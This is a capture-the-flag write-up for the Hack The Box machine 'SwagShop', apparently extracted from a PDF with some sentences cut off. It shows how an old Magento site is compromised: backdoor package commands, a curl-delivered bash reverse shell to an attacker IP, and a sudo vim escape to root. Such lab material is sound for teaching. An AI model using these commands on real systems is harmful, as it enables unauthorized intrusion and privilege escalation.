SYNOPSIS

SwagShop is an easy difficulty linux box running an old version of Magento. The version is
vulnerable to SQLi and RCE leading to a shell. The www user can use vim in the context of root
which can abused to execute commands.

     None             Exploit modification

Searching on exploit-db for exploits related to magento we come across this. It's an
authenticated RCE exploit. As we already have the credentials we can try using it. The exploit
doesn't work out of the box and it needs some changes.

This can be found in the local.xml file from earlier.

the user in.

Let's make that request and intercept it via burp. The creds are ypwq / 123.

ALTERNATE METHOD

THIS METHOD IS NO LONGER WORKING AS THE BOX WAS PATCHED
As we have admin privileges we can upload our own package. A sample malicious package can
be found here.
 git clone https://github.com/lavalamp-/LavaMagentoBD
 cd LavaMagentoBD
 cd Backdoor\ Code
 tar -czvf bd.tgz app package.xml skin
 mv bd.tgz ..

Now from the admin panel, navigate to System > Magento connect. In the direct package file
upload menu, select the tar archive and upload it.

After uploading, browse to http://10.10.10.140/index.php/lavalamp/index. The page should be
available and empty. Use curl to execute commands on a POST request and parameter `c'.

Using this we can now get a reverse shell.
 curl -X POST http://10.10.10.140/index.php/lavalamp/index --data-urlencode
 'c=bash -c "bash -i >& /dev/tcp/10.10.16.47/4444 0>&1"'

PRIVILEGE ESCALATION

Looking at the sudo permissions we that we can use vim as root.

                                                                                                                 Page 16 / 17
Vim is a GTFObin which can be used to break out of restricted shells. Use the following
command to get a root shell.
 sudo /usr/bin/vi /var/www/html/php.ini.sample -c ':!/bin/bash'

This will execute bash and we should be presented with a root shell.
